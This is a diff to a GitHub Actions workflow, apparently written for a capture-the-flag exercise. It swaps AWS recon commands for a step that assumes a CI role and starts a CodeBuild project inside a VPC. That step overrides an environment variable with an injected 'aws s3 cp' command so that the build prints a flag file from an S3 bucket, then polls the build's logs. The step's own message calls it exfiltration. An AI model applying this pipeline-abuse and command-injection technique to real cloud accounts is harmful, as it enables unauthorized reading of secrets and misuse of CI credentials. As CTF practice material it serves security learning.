@@ -17,10 +17,23 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Network and Compute Recon
+      - name: Trigger CodeBuild Inside VPC
         run: |
-          echo "=== Listing EC2 Instances ==="
-          aws ec2 describe-instances --region us-east-1 || true
+          echo "=== Triggering CodeBuild to exfiltrate Flag from VPC ==="
           
-          echo "=== Listing CodeBuild Projects ==="
-          aws codebuild list-projects --region us-east-1 || true
+          # ניסיון הפעלה של ה-CodeBuild עם הזרקת פקודה להדפסת ה-Flag
+          aws codebuild start-build \
+            --project-name codebuild_vpc \
+            --environment-variables-override name=CMD,value="aws s3 cp s3://codec4f26c862a321ef5/flag.txt -",type=PLAINTEXT \
+            > build_output.json || true
+            
+          cat build_output.json || true
+          
+          # נסרוק את הסטטוס של הריצה במידה והצלחנו להפעיל אותה
+          BUILD_ID=$(jq -r '.build.id' build_output.json 2>/dev/null)
+          if [ ! -z "$BUILD_ID" ] && [ "$BUILD_ID" != "null" ]; then
+            echo "Build started with ID: $BUILD_ID"
+            echo "Waiting for logs..."
+            sleep 30
+            aws codebuild batch-get-builds --ids "$BUILD_ID" || true
+          fi
